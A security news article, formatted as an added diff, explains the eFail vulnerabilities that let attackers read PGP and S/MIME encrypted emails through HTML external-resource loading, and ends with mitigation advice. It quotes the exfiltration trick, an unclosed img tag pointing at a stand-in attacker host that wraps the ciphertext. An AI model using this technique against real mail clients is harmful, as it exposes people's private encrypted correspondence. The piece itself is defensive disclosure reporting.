@@ -1,0 +1,27 @@
+Here's How eFail Attack Works Against PGP and S/MIME Encrypted Emails
+Swati Khandelwal
+
+With a heavy heart, security researchers have early released the details of a set of vulnerabilities discovered in email clients for two widely used email encryption standards—PGP and S/MIME—after someone leaked their paper on the Internet, which was actually scheduled for tomorrow.
+PGP and S/MIME are popular end-to-end encryption standards used to encrypt emails in a way that no one, not even the company, government, or cyber criminals, can spy on your communication.
+Before explaining how the vulnerability works, it should be noted that the flaw doesn't reside in the email encryption standards itself; instead, it affects a few email clients/plugins that incorrectly implemented the technologies.
+  (adsbygoogle = window.adsbygoogle || []).push({}); 
+Dubbed eFail by the researchers, the vulnerabilities, as described in our previous early-warning article, could allow potential attackers to decrypt the content of your end-to-end encrypted emails in plaintext, even for messages sent in the past.
+According to the paper released by a team of European security researchers, the vulnerabilities exist in the way encrypted email clients handle HTML emails and external resources, like loading of images, styles from external URLs.
+Here's How the eFail Attack Works:
+Email clients are usually configured to automatically decrypt the content of encrypted emails you receive, but if your client is also configured to load external resources automatically, attackers can abuse this behavior to steal messages in plaintext just by sending you a modified version of the same encrypted email content.
+The attack vector requires injected plaintext into the encrypted mail, and then using the exploit, it will exfiltrate the originally encrypted data as soon as any recipient's mail client accesses (or decrypts) the message
+It should be noted that to perform an eFail attack, an attacker must have access to your encrypted emails, which is then modified in the following way and send back to you in order to trick your email client into revealing the secret message to the remote attacker without alerting you.
+  (adsbygoogle = window.adsbygoogle || []).push({}); 
+As described in the proof-of-concept attack released by the researchers, the attacker uses one of the encrypted messages you are supposed to receive or might have already received and then turns it into a multipart HTML email message, as well as forges the return address, so it appears to come from the original sender.
+In the newly composed email, the attacker adds an unclosed image tag, like this <img src="https://attackersite.com/ just before the encrypted content and ends it by adding the end of the image tag, like this: .jpg">, as clearly shown in the screenshot.
+When your vulnerable email client receives this message, it decrypts the encrypted part of the message given in the middle, and then automatically tries to render the HTML content, i.e., the image tag with all the decrypted text as the new name of the image, as shown below.
+Since your email client will try to load the image from the attacker-controlled server, the attacker can capture this incoming request, where the filename contains the full content of the original encrypted email in plaintext.
+Although PGP has been designed to show you a warning note if the integrity of your email is compromised, a few email clients do not display these warnings, allowing any potential attackers to perform eFail attacks successfully.
+How To Prevent Against eFail Attacks
+Generally, it is a very tough job for an advisory to even intercept your encrypted emails, but for people desperately using email encryption always attract well-resourced and sophisticated attackers.
+Ditching the use of PGP or S/MIME to prevent eFail attacks would be stupid advice, as it is quite easy to mitigate the reported issues.
+Users can switch to a good email client that always shows a warning when the integrity of the emails is compromised and doesn't render HTML emails by default to prevent loading of external resources automatically.
+Researchers also advise users to adopt an authenticated encryption algorithm for sensitive communication.
+The research was conducted by a team of researchers, including Damian Poddebniak, Christian Dresen, Fabian Ising, and Sebastian Schinzel from Munster University of Applied Sciences; Jens Müller, Juraj Somorovsky, and Jörg Schwenk from Ruhr University Bochum; and Simon Friedberger from KU Leuven.
+For more in-depth details on the attack technique, you can head on to this informational page about the eFail attack and the paper [PDF] titled, "Efail: Breaking S/MIME and OpenPGP Email Encryption using Exfiltration Channels," published by the researchers.
+Have something to say about this article? Comment below or share it with us on Facebook, Twitter or our LinkedIn Group.
